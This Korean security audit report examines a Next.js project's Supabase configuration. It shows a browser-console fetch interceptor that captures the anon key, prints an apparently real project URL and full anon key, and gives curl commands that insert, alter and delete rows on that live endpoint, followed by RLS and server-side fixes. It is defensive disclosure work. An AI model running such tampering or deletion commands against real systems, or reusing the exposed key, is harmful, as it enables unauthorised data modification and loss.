# 🔒 Supabase 보안 분석 보고서

## 📅 작성일: 2025-09-02

---

## 1. 개요

본 보고서는 Lodgex 프로젝트의 Supabase 보안 구성을 분석하고, 브라우저를 통한 ANON KEY 탈취 가능성을 실증적으로 검증한 결과입니다.

---

## 2. ANON KEY 탈취 실증 분석

### 2.1 공격 시나리오

공격자가 일반 사용자로서 웹사이트에 접속하여 브라우저 개발자 도구만으로 ANON KEY를 탈취하는 과정을 시연했습니다.

### 2.2 탈취 과정 상세

#### **Step 1: 브라우저 개발자 도구 열기**
```
F12 키 또는 우클릭 → 검사 → Console 탭
```

#### **Step 2: fetch 함수 가로채기 코드 실행**

공격자가 브라우저 콘솔에 다음 코드를 입력:

```javascript
// 원본 fetch 함수를 백업
const originalFetch = window.fetch;

// fetch 함수를 오버라이드하여 API 호출 가로채기
window.fetch = function(url, options = {}) {
  console.log('🔴 Intercepted fetch:', url);
  
  // Supabase API 호출인지 확인
  if (typeof url === 'string' && url.includes('supabase')) {
    window.capturedData = {
      url: url.split('/rest/')[0],
      headers: {}
    };
    
    // 헤더 정보 추출
    if (options.headers) {
      if (options.headers instanceof Headers) {
        options.headers.forEach((value, key) => {
          window.capturedData.headers[key] = value;
          if (key.toLowerCase() === 'apikey') {
            window.capturedData.anonKey = value;
            console.log('🎯 FOUND ANON KEY:', value);
          }
        });
      } else if (typeof options.headers === 'object') {
        for (const [key, value] of Object.entries(options.headers)) {
          window.capturedData.headers[key] = value;
          if (key.toLowerCase() === 'apikey') {
            window.capturedData.anonKey = value;
            console.log('🎯 FOUND ANON KEY:', value);
          }
        }
      }
    }
  }
  
  return originalFetch.call(this, url, options);
};

console.log('✅ Fetch interceptor installed. Navigate to trigger API calls...');
```

#### **Step 3: API 호출 트리거**
- 페이지 내 "인사이트", "이벤트" 등 메뉴 클릭
- 또는 새로고침하여 데이터 로드

#### **Step 4: 정보 획득**

콘솔 출력 결과:
```
🔴 Intercepted fetch: https://xusdsoyfsgqsimskqmrl.supabase.co/rest/v1/posts
🎯 FOUND ANON KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 2.3 탈취된 정보

| 항목 | 값 |
|------|-----|
| **Supabase URL** | `https://xusdsoyfsgqsimskqmrl.supabase.co` |
| **ANON KEY** | `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh1c2Rzb3lmc2dxc2ltc2txbXJsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU4MzgzMTAsImV4cCI6MjA3MTQxNDMxMH0.OoddI9Uz3ZaD1Mbkb90utpFvEaDRvAQ5rzTnUCeC4qs` |

---

## 3. 기술적 분석

### 3.1 탈취가 가능한 이유

#### **JavaScript의 동적 특성**
- 브라우저에서 실행되는 모든 JavaScript 함수는 런타임에 수정 가능
- `window.fetch`, `XMLHttpRequest` 등 네이티브 함수도 오버라이드 가능
- 개발자 도구 콘솔에서 임의의 코드 실행 가능

#### **Next.js 환경변수 노출**
- `NEXT_PUBLIC_` 접두사가 붙은 환경변수는 빌드 시 JavaScript 번들에 포함
- 클라이언트 사이드에서 접근 가능하도록 의도적으로 설계됨
- 브라우저에서 실행되는 코드에 직접 포함

#### **API 호출 구조**
```javascript
// Supabase 클라이언트의 실제 API 호출
fetch('https://[project-ref].supabase.co/rest/v1/[table]', {
  headers: {
    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',  // ANON KEY
    'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
    'accept-profile': 'public',
    'x-client-info': 'supabase-ssr/0.7.0'
  }
})
```

### 3.2 공격자가 할 수 있는 작업

탈취한 ANON KEY로 직접 API 호출 가능:

```bash
# 1. 데이터 조회
curl 'https://xusdsoyfsgqsimskqmrl.supabase.co/rest/v1/posts?select=*' \
  -H 'apikey: [ANON_KEY]' \
  -H 'authorization: Bearer [ANON_KEY]'

# 2. 데이터 삽입 (현재 RLS 정책상 가능)
curl -X POST 'https://xusdsoyfsgqsimskqmrl.supabase.co/rest/v1/posts' \
  -H 'apikey: [ANON_KEY]' \
  -H 'Content-Type: application/json' \
  -d '{"title": "악성 콘텐츠", "content": "..."}'

# 3. 데이터 수정 (현재 RLS 정책상 가능)
curl -X PATCH 'https://xusdsoyfsgqsimskqmrl.supabase.co/rest/v1/posts?id=eq.1' \
  -H 'apikey: [ANON_KEY]' \
  -H 'Content-Type: application/json' \
  -d '{"title": "변조된 제목"}'

# 4. 데이터 삭제 (현재 RLS 정책상 가능)
curl -X DELETE 'https://xusdsoyfsgqsimskqmrl.supabase.co/rest/v1/posts?id=eq.1' \
  -H 'apikey: [ANON_KEY]'
```

---

## 4. 현재 보안 취약점 분석

### 4.1 RLS 정책 문제점

| 테이블 | 문제점 | 위험도 |
|--------|--------|--------|
| **posts** | anon 역할이 INSERT/UPDATE/DELETE 모두 가능 | 🔴 **심각** |
| **categories** | anon 역할이 INSERT/UPDATE/DELETE 모두 가능 | 🔴 **심각** |
| **service_requests** | anon 역할이 모든 작업 가능 (ALL) | 🔴 **심각** |
| **admins** | public 역할이 SELECT 가능 | 🟠 **높음** |

### 4.2 함수 보안 취약점

| 함수명 | 문제점 | 위험도 |
|--------|--------|--------|
| `verify_admin_password` | search_path 변경 가능 | 🟠 **높음** |
| `update_updated_at_column` | search_path 변경 가능 | 🟡 **중간** |
| `increment_view_count` | search_path 변경 가능 | 🟡 **중간** |
| `validate_post_category` | search_path 변경 가능 | 🟡 **중간** |

### 4.3 시스템 구조 문제

1. **자체 인증 시스템 사용**
   - Supabase Auth 미사용
   - localStorage의 adminSession 토큰 사용
   - 클라이언트 사이드 검증에 의존

2. **ANON KEY만으로 모든 작업 가능**
   - 현재 RLS 정책이 anon 역할에 과도한 권한 부여
   - 관리자 검증이 클라이언트 레벨에서만 수행

---

## 5. 보안 강화 방안

### 5.1 즉시 조치 사항 (24시간 내)

#### **RLS 정책 강화**
```sql
-- posts 테이블 보안 강화
ALTER POLICY "Enable delete for all users" ON posts
  USING (false);  -- 관리자 전용으로 변경

ALTER POLICY "Enable update for all users" ON posts  
  USING (false);  -- 관리자 전용으로 변경

-- categories 테이블도 동일하게 적용
ALTER POLICY "Enable delete for all users" ON categories
  USING (false);

ALTER POLICY "Enable update for all users" ON categories
  USING (false);

-- admins 테이블 접근 차단
DROP POLICY "Allow read for login" ON admins;
```

#### **함수 search_path 고정**
```sql
ALTER FUNCTION public.verify_admin_password(text, text)
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.update_updated_at_column()
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.increment_view_count()
  SET search_path = public, pg_catalog;

ALTER FUNCTION public.validate_post_category()
  SET search_path = public, pg_catalog;
```

### 5.2 단기 조치 사항 (1주일 내)

#### **서버 사이드 처리 구현**
```typescript
// app/api/admin/posts/route.ts
import { createClient } from '@supabase/supabase-js'
import { NextResponse } from 'next/server'

const supabaseAdmin = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,  // SERVICE_ROLE_KEY 사용
  {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  }
)

export async function POST(request: Request) {
  // 관리자 세션 검증
  const session = request.headers.get('x-admin-session')
  if (!isValidAdminSession(session)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }
  
  // SERVICE_ROLE_KEY로 데이터 처리
  const body = await request.json()
  const { data, error } = await supabaseAdmin
    .from('posts')
    .insert(body)
  
  return NextResponse.json({ data, error })
}
```

### 5.3 장기 조치 사항 (1개월 내)

1. **적절한 인증 시스템 구현**
   - Supabase Auth 도입 검토
   - 또는 JWT 기반 커스텀 인증 강화

2. **역할 기반 접근 제어 (RBAC)**
   - admin, editor, viewer 등 세분화된 역할
   - 각 역할별 적절한 RLS 정책

3. **감사 로그 시스템**
   - 모든 데이터 변경 사항 기록
   - 비정상 접근 패턴 감지

4. **정기 보안 감사**
   - 월 1회 `supabase__get_advisors` 실행
   - 분기별 외부 보안 감사

---

## 6. 핵심 교훈

### **"클라이언트 사이드는 신뢰할 수 없다"**

1. **NEXT_PUBLIC_ 환경변수는 공개 정보**
   - 브라우저에서 접근 가능하도록 설계됨
   - 민감한 정보 절대 포함 금지

2. **ANON KEY는 공개되어도 안전해야 함**
   - RLS 정책으로 보호
   - 최소 권한 원칙 적용

3. **보안은 서버 사이드에서**
   - 중요 작업은 API Routes 사용
   - SERVICE_ROLE_KEY는 서버에서만

4. **Defense in Depth**
   - 다층 방어 전략
   - 단일 실패점(SPOF) 제거

---

## 7. 결론

현재 시스템은 ANON KEY 탈취 시 데이터 변조가 가능한 상태입니다. 이는 RLS 정책이 anon 역할에 과도한 권한을 부여하고 있기 때문입니다.

**긴급도 평가: 🔴 심각**

즉시 RLS 정책을 강화하고, 중요 작업은 서버 사이드로 이동해야 합니다. ANON KEY는 공개되어도 안전하도록 설계되어야 하며, 실제 보안은 RLS 정책과 서버 사이드 검증으로 보장되어야 합니다.

---

## 8. 참고 자료

- [Supabase Row Level Security](https://supabase.com/docs/guides/auth/row-level-security)
- [Next.js Environment Variables](https://nextjs.org/docs/basic-features/environment-variables)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/platform/security)

---

*본 보고서는 보안 분석 목적으로 작성되었으며, 실제 공격에 사용되어서는 안 됩니다.*